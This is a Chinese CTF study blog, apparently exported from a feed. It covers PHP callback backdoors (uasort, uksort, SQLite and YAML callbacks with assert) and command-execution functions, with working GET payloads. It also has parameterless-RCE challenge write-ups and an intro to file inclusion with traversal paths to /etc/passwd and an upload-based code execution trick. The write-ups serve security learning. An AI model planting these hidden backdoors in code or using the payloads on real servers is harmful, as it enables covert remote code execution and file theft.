<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">uasort</span>(...<span class="variable">$_GET</span>);</span><br><span class="line"><span class="comment"># 1[]=1&amp;1[]=ls&amp;2=system</span></span><br></pre></td></tr></table></figure>
<h2 id="uksort">uksort</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">uksort</span>(<span class="keyword">array</span> &amp;<span class="variable">$array</span>, <span class="keyword">callable</span> <span class="variable">$callback</span>): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP&gt;=5.4.8</strong>时支持<strong>assert</strong>二参数调用</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$sea</span> = <span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>] =&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">uksort</span>(<span class="variable">$sea</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h3 id="扩展">扩展</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// way 0</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]));</span><br><span class="line">    <span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uasort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// way 1</span></span><br><span class="line">    <span class="variable">$arr</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>(<span class="keyword">array</span>(<span class="string">&#x27;sea&#x27;</span> =&gt; <span class="number">1</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>] =&gt; <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$arr</span>-&gt;<span class="title function_ invoke__">uksort</span>(<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line"><span class="comment"># south=system(ls);</span></span><br></pre></td></tr></table></figure>
<h2 id="sqlitecreatefunction">sqliteCreateFunction</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> PDO::<span class="title function_ invoke__">sqliteCreateFunction</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$function_name</span>,</span><br><span class="line">    <span class="keyword">callable</span> <span class="variable">$callback</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$num_args</span> = -<span class="number">1</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$flags</span> = <span class="number">0</span></span><br><span class="line">): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>利用数据库的回调函数。</p>
<blockquote>
<p><strong>PHP&gt;=5.3</strong></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:sqlite.db3&#x27;</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">sqliteCreateFunction</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT exp(:exec)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="keyword">array</span>(<span class="string">&#x27;:exec&#x27;</span> =&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]));</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<h3 id="扩展-1">扩展</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$db</span> = <span class="keyword">new</span> <span class="title class_">SQLite3</span>(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">createFunction</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT exp(?)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindValue</span>(<span class="number">1</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>], SQLITE3_TEXT);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"><span class="comment"># south=assert&amp;sea=system(ls);</span></span><br></pre></td></tr></table></figure>
<p><strong>PHP&lt;5.3</strong>时使用<strong>sqlite_*</strong>方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db</span> = <span class="title function_ invoke__">sqlite_open</span>(<span class="string">&#x27;sqlite.db3&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">sqlite_create_function</span>(<span class="variable">$db</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="title function_ invoke__">sqlite_array_query</span>(<span class="variable">$db</span>, <span class="string">&quot;SELECT exp(&#x27;<span class="subst">&#123;$_GET[&#x27;south&#x27;]&#125;</span>&#x27;)&quot;</span>);</span><br><span class="line"><span class="comment"># south=system(ls)</span></span><br></pre></td></tr></table></figure>
<h2 id="yaml_parse">yaml_parse</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">yaml_parse</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$input</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$pos</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">int</span> &amp;<span class="variable">$ndocs</span> = ?,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$callbacks</span> = <span class="literal">null</span></span><br><span class="line">): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure>
<p>需要额外的组件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line">    <span class="variable">$yaml</span> = <span class="string">&lt;&lt;&lt;EOD</span></span><br><span class="line"><span class="string">    greeting: !<span class="subst">&#123;$str&#125;</span> &quot;|.+|e&quot;</span></span><br><span class="line"><span class="string">    EOD</span>;</span><br><span class="line">    <span class="variable">$parsed</span> = <span class="title function_ invoke__">yaml_parse</span>(<span class="variable">$yaml</span>, <span class="number">0</span>, <span class="variable">$cnt</span>, <span class="keyword">array</span>(<span class="string">&quot;!<span class="subst">&#123;$_GET[&#x27;south&#x27;]&#125;</span>&quot;</span> =&gt; <span class="string">&#x27;preg_replace&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h2 id="memcache">Memcache</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Memcache</span>::<span class="title function_ invoke__">addServer</span>(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$host</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$port</span> = <span class="number">11211</span>,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$persistent</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$weight</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$timeout</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$retry_interval</span> = ?,</span><br><span class="line">    <span class="keyword">bool</span> <span class="variable">$status</span> = ?,</span><br><span class="line">    callback <span class="variable">$failure_callback</span> = ?,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$timeoutms</span> = ?</span><br><span class="line">): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>需要额外的组件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$mem</span> = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">    <span class="variable">$re</span> = <span class="variable">$mem</span>-&gt;<span class="title function_ invoke__">addServer</span>(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">11211</span>, <span class="literal">TRUE</span>, <span class="number">100</span>, <span class="number">0</span>, -<span class="number">1</span>, <span class="literal">TRUE</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b,$c,$d,$e&#x27;</span>, <span class="string">&#x27;return assert($a);&#x27;</span>));</span><br><span class="line">    <span class="variable">$mem</span>-&gt;<span class="title function_ invoke__">connect</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="number">11211</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h1 id="命令执行">命令执行</h1>
<h2 id="system">system</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ?): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>有回显，有返回值，<strong>$return_var</strong>为状态码，执行成功为<strong>0</strong>，反之为<strong>1</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
<h2 id="exec">exec</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">exec</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">array</span> &amp;<span class="variable">$output</span> = ?, <span class="keyword">int</span> &amp;<span class="variable">$return_var</span> = ?): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>无回显，有返回值，需手动获取，<strong>$output</strong>为执行结果，<strong>$return_var</strong>同上。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$output</span>, <span class="variable">$return_var</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$return_var</span>);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
<h2 id="shell_exec">shell_exec</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="keyword">string</span> <span class="variable">$cmd</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>无回显，有返回值，需手动获取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
<h2 id="passthru">passthru</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">int</span> &amp;<span class="variable">$result_code</span> = <span class="literal">null</span>): ?<span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p>有回显，无返回值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=ls</span></span><br></pre></td></tr></table></figure>
<h2 id="反引号">反引号</h2>
<p>无回显，有返回值。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$south</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> `<span class="variable">$south</span>`;</span><br></pre></td></tr></table></figure>
<h2 id="ob_start">ob_start</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="keyword">callable</span> <span class="variable">$output_callback</span> = <span class="literal">null</span>, <span class="keyword">int</span> <span class="variable">$chunk_size</span> = <span class="number">0</span>, <span class="keyword">int</span> <span class="variable">$flags</span> = PHP_OUTPUT_HANDLER_STDFLAGS): <span class="keyword">bool</span></span><br></pre></td></tr></table></figure>
<p><strong>$output_callback</strong>是在<strong>ob_flush()</strong>，<strong>ob_clean()</strong>时候才被调用的回调函数，若非调用函数则返回<strong>FALSE</strong>。<strong>$chunk_size</strong>为缓冲区大小，超出即刷新，<strong>0</strong>则最后调用，最大<strong>4096</strong>，<strong>$erase</strong>为<strong>FALSE</strong>的时候需要等脚本全部执行完毕才能刷新缓冲区，否则会抛出一个<strong>notice</strong>，并返回<strong>FALSE</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">ob_end_flush</span>();</span><br></pre></td></tr></table></figure>
<h2 id="popen">popen</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">popen</span>(<span class="keyword">string</span> <span class="variable">$command</span>, <span class="keyword">string</span> <span class="variable">$mode</span>): resource|<span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>两个参数，一个是命令<strong>$command</strong>，另外一个是文件的连接模式<strong>$mode</strong>，<strong>r/w</strong>分别代表读写。</p>
<p>无执行结果回显，返回文件指针。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">popen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="string">&#x27;r&#x27;</span> );</span><br><span class="line"><span class="comment"># south=ls &gt;&gt; south.txt</span></span><br></pre></td></tr></table></figure>
<h2 id="proc_open">proc_open</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">proc_open</span>(</span><br><span class="line">    <span class="keyword">mixed</span> <span class="variable">$cmd</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$descriptorspec</span>,</span><br><span class="line">    <span class="keyword">array</span> &amp;<span class="variable">$pipes</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$cwd</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$env</span> = <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">array</span> <span class="variable">$other_options</span> = <span class="literal">null</span></span><br><span class="line">): resource</span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP&gt;= 4.3.0</strong></p>
</blockquote>
<p>类似<strong>popen</strong>，就是选项更多了。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$array</span>, <span class="variable">$pipes</span>);</span><br><span class="line"><span class="comment"># south=ls &gt;&gt; south.txt</span></span><br></pre></td></tr></table></figure>
<h2 id="pcntl_exec">pcntl_exec</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">pcntl_exec</span>(<span class="keyword">string</span> <span class="variable">$path</span>, <span class="keyword">array</span> <span class="variable">$args</span> = ?, <span class="keyword">array</span> <span class="variable">$envs</span> = ?): <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p><strong>PHP&gt;= 4.2.0</strong>，需要额外安装。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">pcntl_exec</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;south&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;sea&#x27;</span>]);</span><br><span class="line"><span class="comment"># south=/bin/bash&amp;sea=ls</span></span><br></pre></td></tr></table></figure>
<h1 id="例题">例题</h1>
<h2 id="codebreakingphplimit">2018/CodeBreaking/phplimit</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一句的意思就是匹配无参函数，即phpinfo()可以通过，而system('ls')无法通过。</p>
<p>利用前面提到的无参函数来进行代码执行。</p>
<p>localeconv()返回的是包含本地数字及货币格式信息的数组，其中第一位的点可以拿来用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(localeconv());</span><br><span class="line">var_dump(reset(localeconv()));</span><br><span class="line">var_dump(scandir(reset(localeconv())));</span><br><span class="line">var_dump(end(scandir(reset(localeconv()))));</span><br><span class="line">var_dump(show_source(end(scandir(reset(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>直接读取文件有一些限制，也会很麻烦，因此可以通过获取额外的外部参数来执行代码。</p>
<p>比如：</p>
<p>get_defined_vars() - 返回由所有已定义变量所组成的数组</p>
<p>session_id() - 可以⽤来获取当前会话ID</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=eval(end(current(get_defined_vars())));&amp;a=phpinfo();</span><br></pre></td></tr></table></figure>
<h2 id="gxyctf禁止套娃">2019/GXYCTF/禁止套娃</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if (isset($_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if (&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
<p><strong>1. 需要传⼊⼀个get参数exp
如果满⾜条件就可以执⾏exp</strong></p>
<p><strong>2. preg_match过滤了php伪协议</strong></p>
<p><strong>3. preg_replace
的主要功能就是限制我们传输进来的必须时纯⼩写字⺟的函数，⽽且不能</strong></p>
<p><strong>携带参数。只能匹配通过⽆参数的函数。</strong></p>
<p><strong>4.
最后⼀个preg_match正则匹配掉了et/na/info等关键字，很多函数都⽤不了</strong></p>
<p>**5. eval($_GET['exp']); 典型的⽆参数RCE**</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show_source(next(array_reverse(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br><span class="line"></span><br><span class="line">highlight_file(session_id(session_start()));</span><br><span class="line">Cookie: PHPSESSID=flag.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="长安战疫rce_no_para">2022/长安"战疫"/RCE_No_Para</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">    if (!preg_match(&#x27;/session|end|next|header|dir/i&#x27;, $_GET[&#x27;code&#x27;])) &#123;</span><br><span class="line">        eval($_GET[&#x27;code&#x27;]);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&quot;Hacker!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>差不多的题，ban了一些函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=eval(array_rand(array_flip(current(array_values(get_defined_vars())))));&amp;a=system(%27cat%20flag.php%27);</span><br></pre></td></tr></table></figure>
<h2 id="仔细ping">2023/仔细ping</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">if(&#x27;;&#x27; === preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $a))  &#123;</span><br><span class="line">    if (!preg_match(&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;,$a))&#123;</span><br><span class="line">        eval($a);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;May be you should bypass.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;nonono&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">1=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>
<h1 id="refer">Refer</h1>
<p><a
href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html">创造tips的秘籍——PHP回调后门</a></p>
]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>Web安全修炼计划</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全文件包含修炼计划</title>
    <url>/Study-File-Inclusion/</url>
    <content><![CDATA[<h3 id="前言">前言</h3>
<p>本周任务是<strong>File Inclusion</strong>【文件包含。</p>
<p>文件包含漏洞简单来说就是在使用函数包含文件时，没有对传入的文件名进行有效的过滤，从而被利用包含了其他文件进来，导致服务器上文件信息的泄露甚至会被注入恶意代码。</p>
<p>文件包含分为<strong>LFI</strong>【本地文件包含与<strong>RFI</strong>【远程文件包含，字面意思，其中<strong>RFI</strong>需要<strong>PHP_ini</strong>开启<strong>url_allow_fopen</strong>和<strong>url_allow_include</strong>。</p>
<span id="more"></span>
<h4 id="涉及函数">涉及函数</h4>
<p><strong>include()</strong>，<strong>require()</strong>：会获取指定文件中存在的所有文本/代码/标记，并复制到使用<strong>include</strong>语句的文件中。</p>
<p><strong>include_once()</strong>，<strong>require_once()</strong>：先验证是否已经包含了文件，如果已经包含了，就不再执行。</p>
<p><strong>include()</strong>
，<strong>include_once()</strong>：包含文件时即使遇到错误，下面代码会依然执行。</p>
<p><strong>require()</strong>
，<strong>require_once()</strong>：包含文件时遇到错误，直接报错退出程序。</p>
<h3 id="lfi本地文件包含">LFI【本地文件包含</h3>
<p><strong>LFI</strong>大多出现在模块加载、模板加载和<strong>cache</strong>调用这些地方，有多重利用方式。</p>
<h4 id="x00-training-php-lfi">0x00 <a
href="http://www.wechall.net/challenge/training/php/lfi/up/index.php">Training:
PHP LFI</a></h4>
<p><strong>WeChall</strong>的一道题，源码如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;pages/&#x27;</span>.(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]:<span class="string">&quot;welcome&quot;</span>).<span class="string">&#x27;.html&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$filename</span>;</span><br></pre></td></tr></table></figure>
<p>题目要求包含<strong>solution.php</strong>。</p>
<p>附上<strong>payload</strong>为<strong>?file=../../solution.php%00</strong>。</p>
<p>此处无过滤，仅仅使用了一个拼接的<strong>.</strong>，因此使用<strong>%00</strong>截断来注释掉后面的<strong>html</strong>。</p>
<p>这种简单的文件包含需要满足的条件有<strong>magic_quotes_gpc=off</strong>且小于版本<strong>5.3.4</strong>
。</p>
<p>并且很重要的一点是要有<strong>权限</strong>。</p>
<h5 id="这里是摘抄的笔记"><a
href="https://lalajun.github.io/2018/03/19/WEB-LFI%E4%B8%8ERFI%E5%88%A9%E7%94%A8/">这里是摘抄的笔记</a></h5>
<p>记一下一些关键文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../etc/passwd(操作系统用户信息,该文件为所有用户可见)</span><br><span class="line">../../../../../proc/self/environ(proc目录)</span><br><span class="line">../../../../../../var/log/apache2/access.log(apache日志，需要包括所有上级目录访问权限)</span><br><span class="line"></span><br><span class="line">还有其他配置文件(Web服务器配置文件,Web日志)</span><br></pre></td></tr></table></figure>
<p>同时还有两种截断，一个是<strong>Windows</strong>下长于<strong>256</strong>会被截断，一是<strong>Linux</strong>
下长于<strong>4096</strong>会被截断。</p>
<h4 id="x01-文件包含2">0x01 <a
href="http://118.89.219.210:49166/index.php?file=hello.php">文件包含2</a></h4>
<p>源代码发现有一个<strong>upload.php</strong>。</p>
<p>点开后是一个文件上传<strong>+</strong>文件包含的组合。</p>
<p>由于<strong>include</strong>函数包含的文件会直接将其当做PHP解析，所以所有的<strong>.txt,.jpg,.gif</strong>文件中包含一句话就可以直接菜刀连接。</p>
<p>因此此处只需要将一句话后缀修改上传再使用文件包含进行菜刀连接就行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://118.89.219.210:49166/index.php?file=upload/201808070803369644.jpg</span><br></pre></td></tr></table></figure>
<p>但是连不上🐎，应当是进行了过滤。</p>
<p>然后看题解才知道还能构造如下代码上传。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=php&gt;system(&quot;ls&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>访问重命名后的连接可以看到这行代码被成功执行了。</p>
<p>显示<strong>about hello.php index.php
this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload
upload.php</strong>。</p>
<p>那么就能得到了<strong>SKCTF{uP104D_1nclud3_426fh8_is_Fun}</strong>
。</p>
<h5 id="这里是摘抄的笔记-1"><a
href="http://php.net/manual/zh/language.basic-syntax.phpmode.php">这里是摘抄的笔记</a></h5>
<p><strong>PHP</strong>的开始和结束的标记一共有四种。</p>
